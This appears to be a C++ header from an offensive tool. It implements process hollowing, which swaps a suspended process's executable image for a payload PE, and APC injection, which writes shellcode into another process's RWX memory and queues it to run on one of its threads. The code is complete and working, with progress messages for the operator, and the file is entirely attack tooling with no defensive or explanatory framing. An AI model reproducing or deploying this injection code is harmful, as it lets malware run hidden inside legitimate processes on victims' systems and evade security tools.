#pragma once
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include "syscall_utils.hpp"

namespace Injection {

inline DWORD findProcess(const std::wstring& name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create process snapshot\n");
        return 0;
    }

    PROCESSENTRY32W entry = { sizeof(entry) };
    DWORD pid = 0;

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, name.c_str()) == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return pid;
}

inline bool processHollowing(const std::vector<uint8_t>& payload, const std::wstring& targetProcess) {
    try {
        printf("[+] Starting process hollowing\n");
        printf("[+] Target process: %S\n", targetProcess.c_str());

        // Create suspended process
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (!CreateProcessW(nullptr, const_cast<LPWSTR>(targetProcess.c_str()),
            nullptr, nullptr, FALSE, CREATE_SUSPENDED,
            nullptr, nullptr, &si, &pi)) {
            printf("[-] Failed to create suspended process\n");
            return false;
        }

        printf("[+] Created suspended process (PID: %d)\n", pi.dwProcessId);

        // Get process base address
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(pi.hThread, &ctx)) {
            printf("[-] Failed to get thread context\n");
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        LPVOID imageBase = nullptr;
        SIZE_T bytesRead = 0;
        ReadProcessMemory(pi.hProcess, (LPVOID)(ctx.Rdx + 2 * sizeof(PVOID)), &imageBase, sizeof(PVOID), &bytesRead);

        printf("[+] Target image base: 0x%p\n", imageBase);

        // Parse payload PE headers
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payload.data();
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(payload.data() + dosHeader->e_lfanew);

        // Unmap original executable
        NTSTATUS status = NtApi::UnmapViewOfSection(pi.hProcess, imageBase);
        if (!NT_SUCCESS(status)) {
            printf("[-] Failed to unmap original executable: 0x%08X\n", status);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        printf("[+] Unmapped original executable\n");

        // Allocate memory for new executable
        LPVOID newBase = VirtualAllocEx(pi.hProcess, imageBase,
            ntHeaders->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (!newBase) {
            printf("[-] Failed to allocate memory in target process\n");
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        printf("[+] Allocated memory at: 0x%p\n", newBase);

        // Write headers
        if (!WriteProcessMemory(pi.hProcess, newBase, payload.data(),
            ntHeaders->OptionalHeader.SizeOfHeaders, nullptr)) {
            printf("[-] Failed to write headers\n");
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        printf("[+] Wrote PE headers\n");

        // Write sections
        PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHeaders);
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            LPVOID sectionDest = (LPVOID)((LPBYTE)newBase + sections[i].VirtualAddress);
            LPVOID sectionSrc = (LPVOID)(payload.data() + sections[i].PointerToRawData);
            if (!WriteProcessMemory(pi.hProcess, sectionDest, sectionSrc,
                sections[i].SizeOfRawData, nullptr)) {
                printf("[-] Failed to write section %d\n", i);
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return false;
            }
            printf("[+] Wrote section %d\n", i);
        }

        // Update entry point
        ctx.Rcx = (DWORD64)((LPBYTE)newBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
        if (!SetThreadContext(pi.hThread, &ctx)) {
            printf("[-] Failed to set thread context\n");
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        printf("[+] Updated entry point to: 0x%p\n", (void*)ctx.Rcx);

        // Resume thread
        if (ResumeThread(pi.hThread) == (DWORD)-1) {
            printf("[-] Failed to resume thread\n");
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            return false;
        }

        printf("[+] Process hollowing completed successfully\n");

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return true;
    }
    catch (const std::exception& e) {
        printf("[-] Exception during process hollowing: %s\n", e.what());
        return false;
    }
}

inline bool apcInjection(const std::vector<uint8_t>& shellcode, const std::wstring& targetProcess) {
    try {
        printf("[+] Starting APC injection\n");
        printf("[+] Target process: %S\n", targetProcess.c_str());

        // Find target process
        DWORD pid = findProcess(targetProcess);
        if (!pid) {
            printf("[-] Target process not found\n");
            return false;
        }

        printf("[+] Found target process (PID: %d)\n", pid);

        // Open process
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProcess) {
            printf("[-] Failed to open target process\n");
            return false;
        }

        // Allocate memory
        LPVOID shellcodeAddr = VirtualAllocEx(hProcess, nullptr,
            shellcode.size(), MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        if (!shellcodeAddr) {
            printf("[-] Failed to allocate memory in target process\n");
            CloseHandle(hProcess);
            return false;
        }

        printf("[+] Allocated memory at: 0x%p\n", shellcodeAddr);

        // Write shellcode
        if (!WriteProcessMemory(hProcess, shellcodeAddr,
            shellcode.data(), shellcode.size(), nullptr)) {
            printf("[-] Failed to write shellcode\n");
            VirtualFreeEx(hProcess, shellcodeAddr, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        printf("[+] Wrote shellcode\n");

        // Find target thread
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (snapshot == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to create thread snapshot\n");
            VirtualFreeEx(hProcess, shellcodeAddr, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        THREADENTRY32 entry = { sizeof(entry) };
        HANDLE hThread = nullptr;

        if (Thread32First(snapshot, &entry)) {
            do {
                if (entry.th32OwnerProcessID == pid) {
                    hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, entry.th32ThreadID);
                    if (hThread) break;
                }
            } while (Thread32Next(snapshot, &entry));
        }

        CloseHandle(snapshot);

        if (!hThread) {
            printf("[-] Failed to find target thread\n");
            VirtualFreeEx(hProcess, shellcodeAddr, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        printf("[+] Found target thread (TID: %d)\n", entry.th32ThreadID);

        // Queue APC
        if (!QueueUserAPC((PAPCFUNC)shellcodeAddr, hThread, 0)) {
            printf("[-] Failed to queue APC\n");
            CloseHandle(hThread);
            VirtualFreeEx(hProcess, shellcodeAddr, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        printf("[+] APC injection completed successfully\n");

        CloseHandle(hThread);
        CloseHandle(hProcess);
        return true;
    }
    catch (const std::exception& e) {
        printf("[-] Exception during APC injection: %s\n", e.what());
        return false;
    }
}

} // namespace Injection
